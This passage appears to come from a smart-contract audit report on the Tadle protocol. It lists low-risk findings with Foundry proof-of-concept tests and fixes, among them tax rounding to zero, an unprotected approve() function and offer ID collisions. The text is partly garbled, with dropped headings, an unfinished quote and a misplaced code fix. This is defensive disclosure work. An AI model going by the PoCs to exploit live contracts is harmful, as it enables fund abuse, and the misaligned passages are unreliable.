Assuming healthy competitive market taxes will go down to offer better trades, it is safe to assume that most of the time \u0060makerInfo.eachTradeTax < Constants.EACH_TRADE_TAX_DECIMAL_SCALER\u0060. Thus the division \u0060makerInfo.eachTradeTax / Constants.EACH_TRADE_TAX_DECIMAL_SCALER\u0060 in Solidity will round to 0 if \u0060depositAmount * makerInfo.eachTradeTax\u0060 is not strong enough to make it greater than \u0060Constants.EACH_TRADE_TAX_DECIMAL_SCALER\u0060 and get the right calculation.

### Numerical Example
EACH_TRADE_TAX_DECIMAL_SCALER == 10_000. Let\u0027s say a competitive tax of 1% == \u0060makerInfo.eachTradeTax == 100\u0060. If \u0060depositAmount < (10000 / 100)\u0060, it will round down to 0. 

You might notice that for ERC20s with 18 decimals, an amount of < 100 is ridiculous, and gas cost would be higher than tax savings. But for tokens of <= 2 decimals, this is a real problem. As these tokens, if used, small purchases from modest clients won\u0027t pay taxes. If you paid, let\u0027s say, $3 == \u0060depositAmount == 300\u0060, then \u0060300 * 100 / 10000 == 3000 / 10000 == 3\u0060. But in Solidity, \u00603000 / 10000\u0060 truncates to 0.

A 2 decimal real token example is GUSD (Gemini dollar), see [etherscan](https://etherscan.io/address/0x056fd409e1d7a124bd7017459dfea2f387b6d5cd#readContract).

This problem will probably occur in other parts of the code that use \u0060.mulDiv()\u0060 to calculate token amounts multiplied by some percentage ratio based on the scalars, like in calculating platform fee [here](https://github.com/Cyfrin/2024-08-tadle/blob/main/src/core/PreMarkets.sol#L219). Notice that the scaler here is 1_000_000, so tokens with more than 2 decimals can be problematic too, like famous and super-used USDC with 6 decimals.
Paste this test in the \u0060PreMarkets.t.sol\u0060 file, import \u0060import "forge-std/console.sol";\u0060, and run \u0060forge test --mt "test_skipTax" -vv\u0060. You should also override the \u0060decimals()\u0060 function in the mock contract used by tests, this one (https://github.com/Cyfrin/2024-08-tadle/blob/main/test/mocks/MockERC20Token.sol). Like so:

\u0060\u0060\u0060solidity
function decimals() public pure override returns (uint8) { 
    return 2; 
}
\u0060\u0060\u0060

See test code

Manual review.

There are multiple approaches to mitigate or even eliminate this issue:

- Reducing the constant scaler to something smaller than 10_000 in Layer2s or blockchains where gas costs are low to make it harder for this skip to be profitable.
- Another approach and the one I recommend the most would be, when an operation carries taxes, detecting if the multiplier amount * numerator <= denominator and if so revert saying, minimal amount for avoiding tax evasion is not reached.

ℹ Note: There is probably better ways of fixing this, I do not have enough time to get deeper into it. I encourage the devs to do so.
## Low Risk Findings

### L-01. Rounding Discrepancies in Deposit Amount Calculations

Submitted by eta (https://profiles.cyfrin.io/u/eta), k42 (https://profiles.cyfrin.io/u/k42), Bauer (https://profiles.cyfrin.io/u/Bauer), eeyore (https://profiles.cyfrin.io/u/eeyore), thopatevijay (https://profiles.cyfrin.io/u/thopatevijay), mikebello (https://profiles.cyfrin.io/u/mikebello), fyamf (https://profiles.cyfrin.io/u/fyamf), jsmi (https://profiles.cyfrin.io/u/jsmi), swapnaliss (https://profiles.cyfrin.io/u/swapnaliss), n3smaro (https://profiles.cyfrin.io/u/n3smaro), OdeWeb3 (https://codehawks.cyfrin.io/team/cluqfw65k000169faytyphjol). Selected submission by: swapnaliss (https://profiles.cyfrin.io/u/swapnaliss).

#### Vulnerability Details:

In the \u0060_depositTokenWhenCreateTaker\u0060 function, rounding inconsistencies can lead to slight inaccuracies in deposit amounts. Specifically, the \u0060getDepositAmount\u0060 function utilizes \u0060Math.Rounding.Ceil\u0060, but additional fees are added without aligning with this rounding method.

#### Impact:

These inconsistencies may result in users being charged slightly more than required for their deposits. Although each discrepancy might be small, repeated transactions could cause an unfair accumulation of extra funds within the contract.

#### Proof of Concept:

The following demonstrates the rounding inconsistency: [Link to code](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L813)
## Rounding Inconsistency

\u0060\u0060\u0060solidity
function demonstrateRoundingInconsistency( 
    uint256 depositAmount, 
    uint256 collateralRate, 
    uint256 platformFee, 
    uint256 tradeTax 
) public pure returns (uint256, uint256) { 
    uint256 baseAmount = depositAmount.mulDiv(collateralRate, 10000, Math.Rounding.Ceil); 
    uint256 inconsistentTotal = baseAmount + platformFee + tradeTax; 
    
    uint256 consistentTotal = (depositAmount + platformFee + tradeTax).mulDiv(collateralRate, 10000, Math.Rounding.Ceil); 
    
    return (inconsistentTotal, consistentTotal); 
} 
\u0060\u0060\u0060

- Example: 
  - \u0060demonstrateRoundingInconsistency(10000, 10100, 50, 30)\u0060 
  - Might return \u0060(10150, 10151)\u0060, showing a 1 wei difference 

- Ensure consistent rounding throughout the calculations:
  
\u0060\u0060\u0060solidity
uint256 transferAmount = OfferLibraries.getDepositAmount( 
    offerInfo.offerType, 
    offerInfo.collateralRate, 
    depositAmount + platformFee + tradeTax, 
    false,
    Math.Rounding.Ceil 
); 
\u0060\u0060\u0060

- Consider adopting a more precise calculation method to minimize rounding errors.

## L-02. [Low-01] Missing Access Control in CapitalPool::approve() Function

Allows any User to call it to set Allowance Amount TokenContract to type(uint256).max.

Submitted by:
- [justawanderkid](https://profiles.cyfrin.io/u/justawanderkid)
- [0xkrkba](https://profiles.cyfrin.io/u/0xkrkba)
- [0xreadyplayer1](https://profiles.cyfrin.io/u/0xreadyplayer1)
- [juan](https://profiles.cyfrin.io/u/juan)
- [0xrakesh_ummadi28](https://profiles.cyfrin.io/u/0xrakesh_ummadi28)
- [pelz](https://profiles.cyfrin.io/u/pelz)
- [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf)
- [0xziin](https://profiles.cyfrin.io/u/0xziin)
- [wttt](https://profiles.cyfrin.io/u/wttt)
- [kevinkkien](https://profiles.cyfrin.io/u/kevinkkien)
- [joicygiore](https://profiles.cyfrin.io/u/joicygiore)
- [4gontuk](https://profiles.cyfrin.io/u/4gontuk)
- [ravikiranweb3](https://profiles.cyfrin.io/u/ravikiranweb3)
- [pandasec](https://profiles.cyfrin.io/u/pandasec)
- [0xrolko](https://profiles.cyfrin.io/u/0xrolko)
- [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r)
- [v1vah0us3](https://profiles.cyfrin.io/u/v1vah0us3)
- [fakemonkgin](https://profiles.cyfrin.io/u/fakemonkgin)
- [darshan](https://profiles.cyfrin.io/u/darshan)
- [emanherawy](https://profiles.cyfrin.io/u/emanherawy)
- [guirewire](https://profiles.cyfrin.io/u/guirewire)
- [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707)
- [izcoser](https://profiles.cyfrin.io/u/izcoser)
- [kwakudr](https://profiles.cyfrin.io/u/kwakudr)
- [administrator](https://profiles.cyfrin.io/u/administrator)
- [polaris_tow](https://profiles.cyfrin.io/u/polaris_tow)
- [vladzaev](https://profiles.cyfrin.io/u/vladzaev)
- [pina](https://profiles.cyfrin.io/u/pina)
- [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3)
- [eeyore](https://profiles.cyfrin.io/u/eeyore)
- [AghaDanial](https://profiles.cyfrin.io/u/AghaDanial)
- [abdu1242112](https://profiles.cyfrin.io/u/abdu1242112)
- [0xaraj](https://profiles.cyfrin.io/u/0xaraj)
- [hlx](https://profiles.cyfrin.io/u/hlx)
- [karanel](https://profiles.cyfrin.io/u/karanel)
- [jesjupyter](https://profiles.cyfrin.io/u/jesjupyter)
- [matejdb](https://profiles.cyfrin.io/u/matejdb)
- [youleeyan](https://profiles.cyfrin.io/u/youleeyan)
- [0xdarko](https://profiles.cyfrin.io/u/0xdarko)
- [abandonedplanetplut](https://profiles.cyfrin.io/u/abandonedplanetplut)
- [crisscs](https://profiles.cyfrin.io/u/crisscs)
- [praise03](https://profiles.cyfrin.io/u/praise03)
- [0xbeastboy](https://profiles.cyfrin.io/u/0xbeastboy)
- [0xcontrol](https://profiles.cyfrin.io/u/0xcontrol)
- [waydou](https://profiles.cyfrin.io/u/waydou)
- [demorextess](https://profiles.cyfrin.io/u/demorextess)
- [fourb](https://profiles.cyfrin.io/u/fourb)
- [juggernaut63](https://profiles.cyfrin.io/u/juggernaut63)
- [tinnohofficial](https://profiles.cyfrin.io/u/tinnohofficial)
- [kingnull](https://profiles.cyfrin.io/u/kingnull)
- [fyamf](https://profiles.cyfrin.io/u/fyamf)
- [nourelden](https://profiles.cyfrin.io/u/nourelden)
- [sharonphiliplima](https://profiles.cyfrin.io/u/sharonphiliplima)
- [ivanfitro](https://profiles.cyfrin.io/u/ivanfitro)
- [tdey](https://profiles.cyfrin.io/u/tdey)
- [ZeroProtocol](https://profiles.cyfrin.io/u/ZeroProtocol)
- [dadekuma](https://profiles.cyfrin.io/u/dadekuma)
- [rio1101](https://profiles.cyfrin.io/u/rio1101)
- [vineyard](https://profiles.cyfrin.io/u/vineyard)
- [binary](https://profiles.cyfrin.io/u/binary)
- [air](https://profiles.cyfrin.io/u/air)
- [nikhil20](https://profiles.cyfrin.io/u/nikhil20)
- [mikebello](https://profiles.cyfrin.io/u/mikebello)
- [decap](https://profiles.cyfrin.io/u/decap)
- [soupy](https://profiles.cyfrin.io/u/soupy)
- [canbooo](https://profiles.cyfrin.io/u/canbooo)
- [spomaria](https://profiles.cyfrin.io/u/spomaria)
- [h2134](https://profiles.cyfrin.io/u/h2134)
## Unauthorized Access to approve() Function

The \u0060approve()\u0060 function in the CapitalPool contract lacks access control, allowing any user to call it. This function sets an unlimited token allowance for the TokenManager on a specified token address, enabling unauthorized approvals. The natspec of \u0060CapitalPool::approve()\u0060 function states that it can only be called by the token manager, but that\u0027s not the case here since there are no modifiers that check the \u0060msg.sender\u0060 address to match with the TokenManager contract address.

An unauthorized user can call the \u0060CapitalPool::approve()\u0060 function, which breaks the invariant where the \u0060approve()\u0060 function can only be called as the TokenManager contract, as stated in the natspec of the function.

### Proof of Concepts
A random user comes and calls the \u0060CapitalPool::approve()\u0060 function, which gives the TokenManager Contract approval to spend \u0060type(uint256).max\u0060 amount.

\u0060\u0060\u0060solidity
function test_anyoneCanCallApproveFunction() external { 
    vm.startPrank(user); 
    capitalPool.approve(address(mockUSDCToken)); 
    vm.stopPrank(); 
    assertEq(mockUSDCToken.allowance(address(capitalPool), address(tokenManager)), type(uint256).max); 
    console2.log("This is type(uint256)max:"); 
    console2.log("                  ", type(uint256).max); 
    console2.log("This is The Allowance Amount the \u0027CapitalPool\u0027 Contract Gaved to \u0060TokenContract\u0060:"); 
    console2.log("                  ", mockUSDCToken.allowance(address(capitalPool), address(tokenManager))); 
    console2.log("They Both Match!"); 
}
\u0060\u0060\u0060

The last assertion checks the TokenManager Contract Allowance Amount and compares it to \u0060type(uint256).max\u0060.

You can run the test with the following command:
\u0060\u0060\u0060
forge test --match-test test_anyoneCanCallApproveFunction -vvvv 
\u0060\u0060\u0060

### Take a Look at the Logs:
Logs: 
\u0060\u0060\u0060
This is type(uint256)max: 
115792089237316195423570985008687907853269984665640564039457584007913129639935 
This is The Allowance Amount the \u0027CapitalPool\u0027 Contract Gaved to \u0060TokenContract\u0060: 
115792089237316195423570985008687907853269984665640564039457584007913129639935 
They Both Match! 
\u0060\u0060\u0060

### Recommended Mitigation
Implement access control to restrict the \u0060approve()\u0060 function to authorized callers, such as the TokenManager.
\u0060\u0060\u0060solidity
function approve(address tokenAddr) external onlyTokenManager { 
    address tokenManager = tadleFactory.relatedContracts(RelatedContractLibraries.TOKEN_MANAGER); 
    (bool success, ) = tokenAddr.call(abi.encodeWithSelector(APPROVE_SELECTOR, tokenManager, type(uint256).max)); 
    if (!success) { 
        revert ApproveFailed(); 
    } 
} 

modifier onlyTokenManager() { 
    require(msg.sender == tokenManager, "Caller is not the token manager"); 
    _; 
} 
\u0060\u0060\u0060
This ensures only the TokenManager can call the approve() function, preventing unauthorized access.
## Vulnerability Summary
The referral bonus can\u0027t be split correctly between the referrer and the authority referral.

Submitted by [wellbyt3](https://profiles.cyfrin.io/u/wellbyt3), [Dowsers](https://codehawks.cyfrin.io/team/clxlk29vc000duhxavix3v0ya), [mikebello](https://profiles.cyfrin.io/u/mikebello), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [0x1912](https://profiles.cyfrin.io/u/0x1912). Selected submission by: [mikebello](https://profiles.cyfrin.io/u/mikebello).

The docs of the tadle platform say that the referral bonus can be split between the referrer and the authority referral as the referrer wishes, but in the current \u0060updateReferrerInfo\u0060 function this is not always possible. The referral bonus starts at 30%, and the referrer should be able to distribute this percentage between him and his referrals as he wishes, but the \u0060updateReferrerInfo\u0060 function reverts if \u0060_referrerRate\u0060 is less than the \u0060baseReferralRate\u0060, which is 30%. This is shown in the code below lines 16-18, and this doesn\u0027t allow splitting the referral bonus between the referrer and the authority referral. The referral bonus can be split correctly only when the owner of the contract allows the referrer to give an extra rate: \u0060referralExtraRate\u0060 registered in the \u0060referralExtraRateMap\u0060 mapping.
\u0060\u0060\u0060solidity
function updateReferrerInfo( 
    address _referrer, 
    uint256 _referrerRate, 
    uint256 _authorityRate 
) external { 
    if (_msgSender() == _referrer) { 
        revert InvalidReferrer(_referrer); 
    }
    if (_referrer == address(0x0)) { 
        revert Errors.ZeroAddress(); 
    }
    if (_referrerRate < baseReferralRate) { 
        revert InvalidReferrerRate(_referrerRate); 
    }
    uint256 referralExtraRate = referralExtraRateMap[_referrer]; 
    uint256 totalRate = baseReferralRate + referralExtraRate; 
    if (totalRate > Constants.REFERRAL_RATE_DECIMAL_SCALER) { 
        revert InvalidTotalRate(totalRate); 
    }
    if (_referrerRate + _authorityRate != totalRate) { 
        revert InvalidRate(_referrerRate, _authorityRate, totalRate); 
    }
    ReferralInfo storage referralInfo = referralInfoMap[_referrer]; 
    referralInfo.referrer = _referrer; 
    referralInfo.referrerRate = _referrerRate; 
    referralInfo.authorityRate = _authorityRate; 
    emit UpdateReferrerInfo( 
        msg.sender, 
        _referrer, 
        _referrerRate, 
        _authorityRate 
    ); 
}
\u0060\u0060\u0060
## Vulnerability Description
The test below shows that when a user tries to split the referral bonus between the referrer and the authority referral, the \u0060updateReferrerInfo\u0060 function will revert with the \u0060InvalidReferrerRate\u0060 error, avoiding this split of the referral bonus.
## Referral Bonus Can\u0027t Be Split Correctly
\u0060\u0060\u0060solidity
function test_referral_turbo_usdc() public { 
    // the function reverts if the referrer rate is less than 30%,  
    //so the rate can\u0027t be split between the referrer and the authority referral. 
    vm.prank(user1); 
    vm.expectRevert(abi.encodeWithSelector(ISystemConfig.InvalidReferrerRate.selector, 200000)); 
    systemConfig.updateReferrerInfo(user, 200_000, 100_000); 
    vm.stopPrank(); 
    vm.startPrank(user); 

    preMarktes.createOffer( 
        CreateOfferParams( 
            marketPlace, address(mockUSDCToken), 1000, 0.01 * 1e18, 12000, 300, OfferType.Ask, OfferSettleType.Turbo 
        ) 
    );
    address offerAddr = GenerateAddress.generateOfferAddress(0); 
    preMarktes.createTaker(offerAddr, 500); 
    address stock1Addr = GenerateAddress.generateStockAddress(1); 
    preMarktes.listOffer(stock1Addr, 0.006 * 1e18, 12000); 
    vm.stopPrank(); 
}
\u0060\u0060\u0060
The referral bonus can\u0027t be split correctly between the referrer and the authority referral.

Manual Review

Modified the updateReferrerInfo function to allow the correct split of the referral bonus.
## L-04. listOffer Unsafely References Fungible Identifiers
Submitted by [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [4gontuk](https://profiles.cyfrin.io/u/4gontuk), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [pyro](https://profiles.cyfrin.io/u/pyro), [vladzaev](https://profiles.cyfrin.io/u/vladzaev), [matejdb](https://profiles.cyfrin.io/u/matejdb), [eeyore](https://profiles.cyfrin.io/u/eeyore), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [karanel](https://profiles.cyfrin.io/u/karanel), [auditweiler](https://profiles.cyfrin.io/u/auditweiler), [n08ita](https://profiles.cyfrin.io/u/n08ita), [joshuajee](https://profiles.cyfrin.io/u/joshuajee), [KaiThompson](https://profiles.cyfrin.io/u/KaiThompson), [ragnarok](https://profiles.cyfrin.io/u/ragnarok), [fyamf](https://profiles.cyfrin.io/u/fyamf), [atoko](https://profiles.cyfrin.io/u/atoko), [bube](https://profiles.cyfrin.io/u/bube), [salem](https://profiles.cyfrin.io/u/salem), [0xgenaudits](https://profiles.cyfrin.io/u/0xgenaudits), [yotov721](https://profiles.cyfrin.io/u/yotov721), [mikebello](https://profiles.cyfrin.io/u/mikebello), [vineyard](https://profiles.cyfrin.io/u/vineyard), [turvec](https://profiles.cyfrin.io/u/turvec), [josh4324](https://profiles.cyfrin.io/u/josh4324), [h2134](https://profiles.cyfrin.io/u/h2134), [hunter_w3b](https://profiles.cyfrin.io/u/hunter_w3b), [silentwalker](https://profiles.cyfrin.io/u/silentwalker), [azanux](https://profiles.cyfrin.io/u/azanux), [bkweb3](https://profiles.cyfrin.io/u/bkweb3), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [n3smaro](https://profiles.cyfrin.io/u/n3smaro), [nikhil20](https://profiles.cyfrin.io/u/nikhil20), [pina](https://profiles.cyfrin.io/u/pina), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [honour](https://profiles.cyfrin.io/u/honour), [atharv181](https://profiles.cyfrin.io/u/atharv181), [krisp](https://profiles.cyfrin.io/u/krisp), [valy001](https://profiles.cyfrin.io/u/valy001), [bladesec](https://profiles.cyfrin.io/u/bladesec), [inzinko](https://profiles.cyfrin.io/u/inzinko), [stanchev](https://profiles.cyfrin.io/u/stanchev), [_frolic](https://profiles.cyfrin.io/u/_frolic), [rbserver](https://profiles.cyfrin.io/u/rbserver), [evilshu](https://profiles.cyfrin.io/u/evilshu), [bareli](https://profiles.cyfrin.io/u/bareli), [dinkras](https://profiles.cyfrin.io/u/dinkras). Selected submission by: [auditweiler](https://profiles.cyfrin.io/u/auditweiler).

The listOffer function depends upon identifiers which may have already been used, assuming them to be unique.
The PreMarkets ([source](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol)) contract uses unsafe identifier logic resulting in collisions that lead to denial of service for core functionality.

Notice the following flow in createOffer ([source](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L39C14-L39C25)):

\u0060\u0060\u0060solidity
/// @dev generate address for maker, offer, stock. 
address makerAddr = GenerateAddress.generateMakerAddress(offerId); /// @audit uses_preincrement_offerId 
address offerAddr = GenerateAddress.generateOfferAddress(offerId); /// @audit uses_preincrement_offerId 
address stockAddr = GenerateAddress.generateStockAddress(offerId); /// @audit uses_preincrement_offerId 
/// @custom:snip 
offerId = offerId + 1; /// @audit increment_global_offerId 
/// @custom:snip 
/// @dev update offer info 
offerInfoMap[offerAddr] = OfferInfo({ 
    id: offerId, /// @audit uses_postincrement_offerId 
/// @custom:snip 
/// @dev update stock info 
stockInfoMap[stockAddr] = StockInfo({ 
    id: offerId,  /// @audit uses_postincrement_offerId 
\u0060\u0060\u0060

In this sequence, it is clear to see that whenever createOffer ([source](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L39C14-L39C25)) is invoked, it is possible to inadvertently use identifiers that are already being used in previously-created elements of the offerInfoMap and stockInfoMap. This is to say that different offers can inadvertently share the same state.

PreMarkets.t.sol

In the sequence below, we demonstrate how two calls to createOffer ([source](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L39C14-L39C25)) (i.e. through the nondeterminism of shared access to the blockchain) can result in denial of service:
Multiple calls to \u0060createOffer\u0060 can inadvertently mutate the context of another. For simplicity, we perform all actions as the single \u0060user\u0060, however this is not a requirement, as different users can DoS one another due to the same flaw.

\u0060\u0060\u0060solidity
function test_ask_offer_turbo_eth_dos() public { 
    vm.startPrank(user); 
    preMarktes.createOffer{value: 0.012 * 1e18}( 
        CreateOfferParams( 
            marketPlace, 
            address(weth9), 
            1000, 
            0.01 * 1e18, 
            12000, 
            300, 
            OfferType.Ask, 
            OfferSettleType.Turbo 
        ) 
    ); 
    bool makeAnotherOffer = true; 
    if (makeAnotherOffer) { 
        preMarktes.createOffer{value: 0.012 * 1e18}( 
            CreateOfferParams( 
                marketPlace, 
                address(weth9), 
                1000, 
                0.01 * 1e18, 
                12000, 
                300, 
                OfferType.Ask, 
                OfferSettleType.Turbo 
            ) 
        );
    }
    address offerAddr = GenerateAddress.generateOfferAddress(0); 
    preMarktes.createTaker{value: 0.005175 * 1e18}(offerAddr, 500); 
    address stock1Addr = GenerateAddress.generateStockAddress(1); 
    if (makeAnotherOffer) vm.expectRevert("Mismatched Marketplace status"); 
    preMarktes.listOffer(stock1Addr, 0.006 * 1e18, 12000); 
} 
\u0060\u0060\u0060

Inability to listOffer (https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L295C14-L295C23) through the action of independent actors, resulting in eventual inability to recuperate capital via the intended process of refunding a listing.

Manual Review
## L-05. Wrong parameter in event AbortBidTaker()
Submitted by [0xziin](https://profiles.cyfrin.io/u/0xziin), [eeyore](https://profiles.cyfrin.io/u/eeyore). Selected submission by: [0xziin](https://profiles.cyfrin.io/u/0xziin).

Wrong parameter in event AbortBidTaker() could cause problems with offchain applications/Dapps, and mislead the end user.

In \u0060IPerMarkets.sol\u0060 the event is defined as follows:
\u0060\u0060\u0060solidity
/// @dev Event when taker aborted 
event AbortBidTaker(address indexed stock, address indexed authority); 
\u0060\u0060\u0060
But in \u0060PreMarkets.sol\u0060:
\u0060\u0060\u0060solidity
function abortBidTaker(address _stock, address _offer) external { 
    ... 
    emit AbortBidTaker(_offer, _msgSender()); 
    ... 
} 
\u0060\u0060\u0060
It should be \u0060_stock\u0060 and not \u0060_offer\u0060, according to \u0060IPerMarkets.sol\u0060:
\u0060\u0060\u0060solidity
emit AbortBidTaker(_stock, _msgSender()); 
\u0060\u0060\u0060

Off chain applications and Dapps rely on information given by events, this could lead to several problems in applications, misleading the end user.

Github, VisualCode.

Replace \u0060_offer\u0060 by \u0060_stock\u0060.

## L-06. Incorrect Check in closeBidOffer function
Submitted by [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [kwakudr](https://profiles.cyfrin.io/u/kwakudr), [0xnolo](https://profiles.cyfrin.io/u/0xnolo), [MinhTriet](https://profiles.cyfrin.io/u/MinhTriet), [eta](https://profiles.cyfrin.io/u/eta), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [bube](https://profiles.cyfrin.io/u/bube), [0xrolko](https://profiles.cyfrin.io/u/0xrolko), [cheatcode](https://profiles.cyfrin.io/u/cheatcode), [maushishreal](https://profiles.cyfrin.io/u/maushishreal), [0xsecuri](https://profiles.cyfrin.io/u/0xsecuri). Selected submission by: [cheatcode](https://profiles.cyfrin.io/u/cheatcode).

The \u0060closeBidOffer\u0060 function is intended to close a bid offer, but it\u0027s checking if the offer status is "Virgin" (presumably meaning untouched or new). This doesn\u0027t align with the function\u0027s purpose or the comment above the function.
\u0060\u0060\u0060solidity
// Reference link
https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/DeliveryPlace.sol#L58
\u0060\u0060\u0060
The comment states:
However, the code is checking for the opposite condition:
\u0060\u0060\u0060solidity
if (offerInfo.offerStatus != OfferStatus.Virgin) { 
    revert InvalidOfferStatus(); 
}
\u0060\u0060\u0060
This means the function will revert for any offer that isn\u0027t in the Virgin status, which contradicts the intended behavior described in the comment.

Funds could potentially be locked in the contract. If bid offers can\u0027t be closed properly, the deposited funds for these offers might become inaccessible. This could lead to a loss of funds for users who can\u0027t retrieve their unused bid amounts.
## Mitigation
The condition should be changed to check for the Settling status instead.
\u0060\u0060\u0060solidity
if (offerInfo.offerStatus != OfferStatus.Settling) { 
    revert InvalidOfferStatus(); 
}
\u0060\u0060\u0060
And the correct comment should be:
\u0060\u0060\u0060solidity
/** 
 * @notice Close bid offer 
 * @dev caller must be offer authority 
 * @dev offer type must be Bid 
 * @dev offer status must be Settling 
 * @dev refund amount = offer amount - used amount 
 */ 
\u0060\u0060\u0060
Submitted by [Bauer](https://profiles.cyfrin.io/u/Bauer), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [irondevx](https://profiles.cyfrin.io/u/irondevx), [0xswahili](https://profiles.cyfrin.io/u/0xswahili), [n08ita](https://profiles.cyfrin.io/u/n08ita), [Hrom131](https://profiles.cyfrin.io/u/Hrom131), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [fyamf](https://profiles.cyfrin.io/u/fyamf), [pascal](https://profiles.cyfrin.io/u/pascal), [unique](https://profiles.cyfrin.io/u/unique), [touthang](https://profiles.cyfrin.io/u/touthang), [nikhil20](https://profiles.cyfrin.io/u/nikhil20), [bladesec](https://profiles.cyfrin.io/u/bladesec), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [zukanopro](https://profiles.cyfrin.io/u/zukanopro).  
Selected submission by: [Hrom131](https://profiles.cyfrin.io/u/Hrom131).

The platform code does not provide secure ways to derive platform revenue with updating platformFee field values inside PreMarkets contract.

When users interact with the platform, platformFee is accumulated in MakerInfo inside PreMarkets contracts, which displays the platform\u0027s earnings for a particular maker.  
The vulnerability is that the system code does not add functions by which, for example, a contract owner would be able to derive platform revenues with further updates to the values of the platformFee parameter.  
Of course, the TokenManager contract has a rescue function that can withdraw tokens from the contract, but this method for withdrawing rewards is a bad option as it will never update the values of the platformFee parameters inside the PreMarkets contract. This in turn leads to a complicated calculation of how many tokens to withdraw between income withdrawals.

Complicated platform rewards calculation and withdrawal process, which is not very trustworthy from the users\u0027 point of view, and also does not update the values of platformFee parameters inside the PreMarkets contract.
Manual auditing of the protocol code was used to discover the vulnerability. No third-party programs were used.

Add a function to withdraw platform rewards. You could also change the logic of accumulating platform rewards a bit. Instead of writing values inside each MakerInfo, you could have one variable at the contract level. Then it would be easy to get the total value of the protocol rewards and would be cheaper since only one value would need to be updated.

Submitted by [0xreadyplayer1](https://profiles.cyfrin.io/u/0xreadyplayer1), [abandonedplanetplut](https://profiles.cyfrin.io/u/abandonedplanetplut), [sabit](https://profiles.cyfrin.io/u/sabit), [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3), [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [pro_king](https://profiles.cyfrin.io/u/pro_king), [brene](https://profiles.cyfrin.io/u/brene), [0xmilenov](https://profiles.cyfrin.io/u/0xmilenov), [maushishreal](https://profiles.cyfrin.io/u/maushishreal), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [hunter_w3b](https://profiles.cyfrin.io/u/hunter_w3b). Selected submission by: [hunter_w3b](https://profiles.cyfrin.io/u/hunter_w3b).

The PerMarkets::createOffer function currently includes a validation check to ensure that the collateralRate parameter is at least 100% by comparing it against a constant (Constants.COLLATERAL_RATE_DECIMAL_SCALER). However, the documentation specifies that the collateralRate must be greater than 100% * @dev collateralRate must be more than 100%, decimal scaler is 10000.

The current implementation only enforces that the collateralRate is not less than 100%, which means a collateralRate equal to 100% would be incorrectly accepted.

\u0060\u0060\u0060solidity
function createOffer(CreateOfferParams calldata params) external payable { 
    /** 
     * @dev points and amount must be greater than 0 
     * @dev eachTradeTax must be less than 100%, decimal scaler is 10000 
     * @dev collateralRate must be more than 100%, decimal scaler is 10000 
     */ 
    if (params.points == 0x0 || params.amount == 0x0) { 
        revert Errors.AmountIsZero(); 
    } 
    if (params.eachTradeTax > Constants.EACH_TRADE_TAX_DECIMAL_SCALER) { 
        revert InvalidEachTradeTaxRate(); 
    } 
    if (params.collateralRate < Constants.COLLATERAL_RATE_DECIMAL_SCALER) { 
        revert InvalidCollateralRate(); 
    } 
}
\u0060\u0060\u0060
## Allowing a collateralRate of exactly 100%
Allowing a collateralRate of exactly 100% when the system requires it to be strictly greater than 100% could lead to inadequate collateralization.

- Manual Review

Update the validation logic to enforce that the collateralRate must be strictly greater than 100%. The condition should be modified as follows:
The code comments in definition of \u0060Premarket.sol#CreateOffer\u0060 states that eachTradeTax must be less than 100%, decimal scaler is 10000, however, the code only reverts if eachTradeTax is greater than 10_000, leaving room for erroneous offers creation at the exact Trade tax of 10_000 or 100% that will affect future integrations and development due developer\u0027s assumptions being wrong.

Here are the code blocks that might be helpful to visualize and understand the issue:
## \u0060PreMarket.sol\u0060
\u0060\u0060\u0060solidity
function createOffer(CreateOfferParams calldata params) external payable { 
    /**
     * //snip 
     * @dev eachTradeTax must be less than 100%, decimal scaler is 10000 
     * //snip 
     */ 

    //snip 
    if (params.eachTradeTax > Constants.EACH_TRADE_TAX_DECIMAL_SCALER) { 
        revert InvalidEachTradeTaxRate(); 
    } 
}
\u0060\u0060\u0060

### Code Change
\u0060\u0060\u0060solidity
if (params.collateralRate <= Constants.COLLATERAL_RATE_DECIMAL_SCALER) { 
    revert InvalidCollateralRate(); 
} 
\u0060\u0060\u0060

## Affected Submissions
Submitted by:
- [0xreadyplayer1](https://profiles.cyfrin.io/u/0xreadyplayer1)
- [sabit](https://profiles.cyfrin.io/u/sabit)
- [abandonedplanetplut](https://profiles.cyfrin.io/u/abandonedplanetplut)
- [0xbeastboy](https://profiles.cyfrin.io/u/0xbeastboy)
- [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3)
- [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake)
- [brene](https://profiles.cyfrin.io/u/brene)
